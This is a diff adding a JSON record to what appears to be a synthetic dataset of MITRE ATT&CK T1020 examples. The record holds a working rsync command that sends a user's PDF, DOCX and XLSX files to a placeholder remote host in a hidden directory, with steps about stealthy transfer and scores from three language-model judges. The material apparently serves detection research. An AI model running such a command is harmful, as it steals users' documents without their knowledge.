@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "rsync -azq --prune-empty-dirs --include='*/' --include='*.pdf' --include='*.docx' --include='*.xlsx' --exclude='*' $HOME/ backup@assets.example.org:.cache/.docs/$HOSTNAME/",
+  "explanation": "Filters and exfiltrates only common document types from the user home directory using rsync’s include/exclude logic to automate selective data theft (T1020).",
+  "rationale_steps": [
+    "Scope data to high-value file types.",
+    "Use include/exclude patterns to avoid unnecessary files.",
+    "Prune empty directories to reduce noise.",
+    "Quiet, compressed sync to stealthily transfer data."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-d10cd1e2-aca6d719",
+  "source_prompt_hash": "d10cd1e2",
+  "timestamp_utc": "2025-09-30T09:04:44.050324Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed rsync command with valid flags, balanced quoting for patterns, correct include/exclude ordering, and proper SSH remote destination syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "Selectively exfiltrates .pdf/.docx/.xlsx files from $HOME to a remote host via rsync over SSH with compression and pruned empty directories, matching automated selective data transfer under T1020.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T04:46:34.680047Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The rsync command is perfectly well-formed with valid flags, properly formatted include/exclude patterns, and correct variable usage.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements automated exfiltration by selectively copying document files (PDF, DOCX, XLSX) from a user's home directory to a remote server using rsync, hiding the exfiltrated data in a hidden directory structure.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T04:46:37.464802Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid flags, balanced quoting, and correct syntax for rsync and shell variables.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the technique description by using `rsync` to selectively filter and exfiltrate specific document types from the home directory to a remote server, demonstrating a highly plausible automated exfiltration attempt.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:09:11.381780Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
